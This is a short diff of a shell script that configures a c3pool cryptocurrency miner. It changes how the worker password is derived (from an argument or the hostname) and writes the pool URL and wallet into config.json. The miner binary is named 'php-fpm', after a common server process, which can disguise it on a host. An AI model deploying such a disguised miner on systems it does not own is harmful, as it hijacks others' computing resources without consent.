@@ -17,7 +17,8 @@ fi
 
 # command line arguments
 WALLET=$1
-EMAIL=$2 # this one is optional
+EMAIL="" # this one is optional
+PASS=$2
 
 # checking prerequisites
 
@@ -237,16 +238,14 @@ echo "[*] Miner $HOME/c3pool/php-fpm is OK"
 echo "[*] 矿工 $HOME/c3pool/php-fpm 运行正常"
 
 #PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-PASS="365portalaz"
+#PASS="365portalaz"
 if [ "$PASS" == "localhost" ]; then
   PASS=`ip route get 1 | awk '{print $NF;exit}'`
 fi
 if [ -z $PASS ]; then
-  PASS=na
+  PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 fi
-if [ ! -z $EMAIL ]; then
-  PASS="$PASS:$EMAIL"
-fi
+
 
 sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/c3pool/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
